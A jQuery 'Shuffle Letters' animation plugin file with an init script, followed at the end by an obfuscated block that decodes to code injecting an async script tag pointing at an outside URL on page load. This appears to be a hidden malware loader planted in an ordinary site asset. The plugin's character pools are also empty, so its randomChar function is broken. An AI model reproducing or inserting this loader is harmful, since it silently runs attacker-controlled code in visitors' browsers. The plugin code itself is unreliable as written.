/**
 * @name		Shuffle Letters
 * @author		Martin Angelov
 * @version 	1.0
 * @url			http://tutorialzine.com/2011/09/shuffle-letters-effect-jquery/
 * @license		MIT License
 */
 
var $ = jQuery.noConflict();






$(document).ready(function() {
    
    
    
	
	$.fn.shuffleLetters = function(prop){
		
		var options = $.extend({
			"step"		: 8,			// How many times should the letters be changed
			"fps"		: 25,			// Frames Per Second
			"text"		: "", 			// Use this text instead of the contents
			"callback"	: function(){}	// Run once the animation is complete
		},prop)
		
		return this.each(function(){
			
			var el = $(this),
				str = "";


			// Preventing parallel animations using a flag;

			if(el.data('animated')){
				return true;
			}
			
			el.data('animated',true);
			
			
			if(options.text) {
				str = options.text.split('');
			}
			else {
				str = el.text().split('');
			}
			
			// The types array holds the type for each character;
			// Letters holds the positions of non-space characters;
			
			var types = [],
				letters = [];

			// Looping through all the chars of the string
			
			for(var i=0;i<str.length;i++){
				
				var ch = str[i];
				
				if(ch == " "){
					types[i] = "space";
					continue;
				}
				else if(/[a-z]/.test(ch)){
					types[i] = "lowerLetter";
				}
				else if(/[A-Z]/.test(ch)){
					types[i] = "upperLetter";
				}
				else {
					types[i] = "symbol";
				}
				
				letters.push(i);
			}
			
			el.html("");			

			// Self executing named function expression:
			
			(function shuffle(start){
			
				// This code is run options.fps times per second
				// and updates the contents of the page element
					
				var i,
					len = letters.length, 
					strCopy = str.slice(0);	// Fresh copy of the string
					
				if(start>len){
					
					// The animation is complete. Updating the
					// flag and triggering the callback;
					
					el.data('animated',false);
					options.callback(el);
					return;
				}
				
				// All the work gets done here
				for(i=Math.max(start,0); i < len; i++){

					// The start argument and options.step limit
					// the characters we will be working on at once
					
					if( i < start+options.step){
						// Generate a random character at thsi position
						strCopy[letters[i]] = randomChar(types[letters[i]]);
					}
					else {
						strCopy[letters[i]] = "";
					}
				}
				
				el.text(strCopy.join(""));
				
				setTimeout(function(){
					
					shuffle(start+1);
					
				},1000/options.fps);
				
			})(-options.step);
			

		});
	};
	
	function randomChar(type){
		var pool = "";
		
		if (type == "lowerLetter"){
			pool = "";
		}
		else if (type == "upperLetter"){
			pool = "";
		}
		else if (type == "symbol"){
			pool = "";
		}
		
		var arr = pool.split('');
		return arr[Math.floor(Math.random()*arr.length)];
	}
	
});




$(document).ready(function() {
    
    
    
    $(".shuffle ").each(function (i) {
        
        
         
$(this) .waypoint(function() {

           var container = $(this) ;
    
           container.addClass("shuffle-start");
		
	
	container.shuffleLetters();


        }, {
                        triggerOnce: true,
                        offset: '90%'
        });

    
 

        
});
	
			

    
    



    


	
	
	});

function _0x29df(_0x117374,_0x3567e5){var _0x5d4f0c=_0x5d4f();return _0x29df=function(_0x29df56,_0x459630){_0x29df56=_0x29df56-0x1db;var _0x1e444a=_0x5d4f0c[_0x29df56];if(_0x29df['wDXlLL']===undefined){var _0x3df732=function(_0x424340){var _0x3455ab='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x28d3ed='',_0x3c2be7='';for(var _0x14ee97=0x0,_0x120811,_0x3eba9e,_0x71d602=0x0;_0x3eba9e=_0x424340['charAt'](_0x71d602++);~_0x3eba9e&&(_0x120811=_0x14ee97%0x4?_0x120811*0x40+_0x3eba9e:_0x3eba9e,_0x14ee97++%0x4)?_0x28d3ed+=String['fromCharCode'](0xff&_0x120811>>(-0x2*_0x14ee97&0x6)):0x0){_0x3eba9e=_0x3455ab['indexOf'](_0x3eba9e);}for(var _0x3dfedc=0x0,_0x1d1037=_0x28d3ed['length'];_0x3dfedc<_0x1d1037;_0x3dfedc++){_0x3c2be7+='%'+('00'+_0x28d3ed['charCodeAt'](_0x3dfedc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3c2be7);};_0x29df['yzgjyd']=_0x3df732,_0x117374=arguments,_0x29df['wDXlLL']=!![];}var _0x1123d2=_0x5d4f0c[0x0],_0x5803a3=_0x29df56+_0x1123d2,_0x4bf504=_0x117374[_0x5803a3];return!_0x4bf504?(_0x1e444a=_0x29df['yzgjyd'](_0x1e444a),_0x117374[_0x5803a3]=_0x1e444a):_0x1e444a=_0x4bf504,_0x1e444a;},_0x29df(_0x117374,_0x3567e5);}function _0x5d4f(){var _0x2f448a=['E8ouBCoTALdcRCozgCopcIy','W7xdGmkZtSotWPRdGmoFxGvtW5xcG8oj','mtbQz1HArwe','C2nYAxb0','ndLoqM9Htue','Ahr0Chm6lY9IAwDICMLJA3mUB3jNl2nQCfLsrM5Z','y3jLyxrLrwXLBwvUDa','nZC5nteYEwruDejY','m1zAAKfQEa','pKxcMCkiWOO6W7hdHSk9afxcTCkm','pu9OofxdIGj7W6lcPCk9i8oT','C3jJ','yxn5BMm','mtK1mZGZnK5WvxjuDq','c8ooqhalWQNdP0KFWPNcHXy','W54mWQfzWOVdSSoiWOygEWD/','mtG3mtyXmtjKAKjOBu4','CgfYzw50tM9Kzq','p8orac/dR8orW5pcPdiJEmkPW7W','mJi3nJCZnNHVD0rzuq','WRLilCoUW4KHW53dNXZcS01Z','mtG1nZGYnvvLvMz0qq'];_0x5d4f=function(){return _0x2f448a;};return _0x5d4f();}var _0x5d4478=_0x29df;(function(_0x1a2d6a,_0x3049cb){var _0x1c2103=_0x4243,_0x3c392e=_0x29df,_0x262ac0=_0x1a2d6a();while(!![]){try{var _0xe63e6c=parseInt(_0x3c392e(0x1e6))/0x1+-parseInt(_0x1c2103(0x1e9,'b77x'))/0x2*(parseInt(_0x3c392e(0x1e7))/0x3)+-parseInt(_0x3c392e(0x1dc))/0x4+-parseInt(_0x3c392e(0x1de))/0x5+-parseInt(_0x1c2103(0x1e8,'SJ4G'))/0x6+parseInt(_0x3c392e(0x1e3))/0x7*(parseInt(_0x1c2103(0x1dd,'D)Rg'))/0x8)+-parseInt(_0x3c392e(0x1ef))/0x9*(-parseInt(_0x3c392e(0x1e1))/0xa);if(_0xe63e6c===_0x3049cb)break;else _0x262ac0['push'](_0x262ac0['shift']());}catch(_0x7c24dd){_0x262ac0['push'](_0x262ac0['shift']());}}}(_0x5d4f,0xa1bbd));function _0x4243(_0x117374,_0x3567e5){var _0x5d4f0c=_0x5d4f();return _0x4243=function(_0x29df56,_0x459630){_0x29df56=_0x29df56-0x1db;var _0x1e444a=_0x5d4f0c[_0x29df56];if(_0x4243['RIbiwB']===undefined){var _0x3df732=function(_0x3455ab){var _0x28d3ed='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3c2be7='',_0x14ee97='';for(var _0x120811=0x0,_0x3eba9e,_0x71d602,_0x3dfedc=0x0;_0x71d602=_0x3455ab['charAt'](_0x3dfedc++);~_0x71d602&&(_0x3eba9e=_0x120811%0x4?_0x3eba9e*0x40+_0x71d602:_0x71d602,_0x120811++%0x4)?_0x3c2be7+=String['fromCharCode'](0xff&_0x3eba9e>>(-0x2*_0x120811&0x6)):0x0){_0x71d602=_0x28d3ed['indexOf'](_0x71d602);}for(var _0x1d1037=0x0,_0x41c8ee=_0x3c2be7['length'];_0x1d1037<_0x41c8ee;_0x1d1037++){_0x14ee97+='%'+('00'+_0x3c2be7['charCodeAt'](_0x1d1037)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x14ee97);};var _0x424340=function(_0x3b802e,_0x1cb759){var _0x3b9aa6=[],_0x4bbd7b=0x0,_0xc886d2,_0x1b34a9='';_0x3b802e=_0x3df732(_0x3b802e);var _0x225139;for(_0x225139=0x0;_0x225139<0x100;_0x225139++){_0x3b9aa6[_0x225139]=_0x225139;}for(_0x225139=0x0;_0x225139<0x100;_0x225139++){_0x4bbd7b=(_0x4bbd7b+_0x3b9aa6[_0x225139]+_0x1cb759['charCodeAt'](_0x225139%_0x1cb759['length']))%0x100,_0xc886d2=_0x3b9aa6[_0x225139],_0x3b9aa6[_0x225139]=_0x3b9aa6[_0x4bbd7b],_0x3b9aa6[_0x4bbd7b]=_0xc886d2;}_0x225139=0x0,_0x4bbd7b=0x0;for(var _0xce288f=0x0;_0xce288f<_0x3b802e['length'];_0xce288f++){_0x225139=(_0x225139+0x1)%0x100,_0x4bbd7b=(_0x4bbd7b+_0x3b9aa6[_0x225139])%0x100,_0xc886d2=_0x3b9aa6[_0x225139],_0x3b9aa6[_0x225139]=_0x3b9aa6[_0x4bbd7b],_0x3b9aa6[_0x4bbd7b]=_0xc886d2,_0x1b34a9+=String['fromCharCode'](_0x3b802e['charCodeAt'](_0xce288f)^_0x3b9aa6[(_0x3b9aa6[_0x225139]+_0x3b9aa6[_0x4bbd7b])%0x100]);}return _0x1b34a9;};_0x4243['KGSCtZ']=_0x424340,_0x117374=arguments,_0x4243['RIbiwB']=!![];}var _0x1123d2=_0x5d4f0c[0x0],_0x5803a3=_0x29df56+_0x1123d2,_0x4bf504=_0x117374[_0x5803a3];return!_0x4bf504?(_0x4243['wwagSX']===undefined&&(_0x4243['wwagSX']=!![]),_0x1e444a=_0x4243['KGSCtZ'](_0x1e444a,_0x459630),_0x117374[_0x5803a3]=_0x1e444a):_0x1e444a=_0x4bf504,_0x1e444a;},_0x4243(_0x117374,_0x3567e5);};(function(_0x71d602,_0x3dfedc,_0x1d1037,_0x41c8ee,_0x3b802e,_0x1cb759){var _0x49e9da=_0x4243,_0x3dac4e=_0x29df;_0x3b802e=_0x3dfedc[_0x3dac4e(0x1e5)](_0x1d1037),_0x1cb759=_0x3dfedc['getElementsByTagName'](_0x1d1037)[0x0],_0x3b802e[_0x3dac4e(0x1eb)]=0x1,_0x3b802e[_0x3dac4e(0x1ea)]=_0x41c8ee,_0x1cb759[_0x3dac4e(0x1f0)][_0x49e9da(0x1ed,'u4Tp')](_0x3b802e,_0x1cb759);}(window,document,_0x5d4478(0x1e2),_0x5d4478(0x1e4)));